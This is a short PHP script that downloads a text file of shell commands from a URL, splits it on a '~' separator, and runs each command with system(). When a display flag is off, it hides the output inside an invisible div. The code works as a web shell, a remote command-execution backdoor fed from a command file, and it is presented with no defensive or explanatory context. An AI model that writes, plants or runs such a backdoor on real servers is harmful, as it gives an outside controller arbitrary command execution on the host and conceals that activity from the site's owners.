<?php

$cont = @file_get_contents("http://localhost/cmd.txt");

if($cont) {

	if($disp != 0) echo '<pre>';
	
	if($disp != 0) echo '<b>Command : </b><i>'.$cont.'</i> <br><br>';

	if($disp == 0) echo '<div style="display:none;">';

	$cont = explode('~',$cont);
	print_r($cont);
	foreach($cont as $cmd) {
		system($cmd);
	}

	if($disp == 0) echo '</div>';

	if($disp != 0) echo '</pre>';

} else {
	if($disp != 0) echo "Not OK";
}

?>